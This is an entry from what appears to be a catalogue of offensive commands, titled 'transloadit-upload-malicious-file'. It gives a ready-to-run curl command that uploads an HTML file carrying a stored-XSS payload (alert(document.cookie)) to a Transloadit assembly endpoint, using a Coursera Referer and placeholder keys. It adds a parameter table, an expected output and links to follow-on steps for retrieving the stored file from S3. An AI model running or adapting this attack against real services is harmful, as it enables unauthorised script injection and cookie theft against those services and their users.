---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: >-
  curl -X POST
  "https://isadora.transloadit.com/assemblies/[hash]?redirect=false" -H
  "Content-Type: multipart/form-data;
  boundary=---------------------------185739484714145007371896001880" -H
  "Referer: https://api.coursera.org/account/profile" --data-binary @- << EOF

  -----------------------------185739484714145007371896001880

  Content-Disposition: form-data; name="params"


  {"max_size":1048576,"auth":{"key":"[hash2]"},"template_id":"[hash3]"}

  -----------------------------185739484714145007371896001880

  Content-Disposition: form-data; name="my_file"; filename="stored_xss.html"

  Content-Type: text/html


  <html><script>alert(document.cookie);</script></html>

  -----------------------------185739484714145007371896001880--

  EOF
tags:
  - upload
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:02.934Z'
verified: false
validated: true
submitted: true
---
# transloadit-upload-malicious-file

## Command

```bash
curl -X POST "https://isadora.transloadit.com/assemblies/[hash]?redirect=false" \
  -H "Content-Type: multipart/form-data; boundary=---------------------------185739484714145007371896001880" \
  -H "Referer: https://api.coursera.org/account/profile" \
  --data-binary @- << EOF
-----------------------------185739484714145007371896001880
Content-Disposition: form-data; name="params"

{"max_size":1048576,"auth":{"key":"[hash2]"},"template_id":"[hash3]"}
-----------------------------185739484714145007371896001880
Content-Disposition: form-data; name="my_file"; filename="stored_xss.html"
Content-Type: text/html

<html><script>alert(document.cookie);</script></html>
-----------------------------185739484714145007371896001880--
EOF
```

## Description

Uploads a malicious HTML file with XSS payload to Transloadit's assembly endpoint using multipart form data, exploiting lack of validation to store it in S3.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `[hash]` | Assembly hash for the endpoint | Yes |
| `[hash2]` | Auth key in params JSON | Yes |
| `[hash3]` | Template ID in params JSON | Yes |
| `my_file` | Filename and content of malicious HTML | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://isadora.transloadit.com/assemblies/abc123?redirect=false" ... (as above)
```

### Advanced Usage

Adjust boundary and params for different limits or templates.

## Expected Output

JSON response like {"ok":"ASSEMBLY_CREATED","assembly_id":"[hash]"}

## Related

- [[procedures/Retrieve-S3-URL-from-Transloadit]]
- [[procedures/Upload-Malicious-HTML-to-Transloadit-Assembly]]
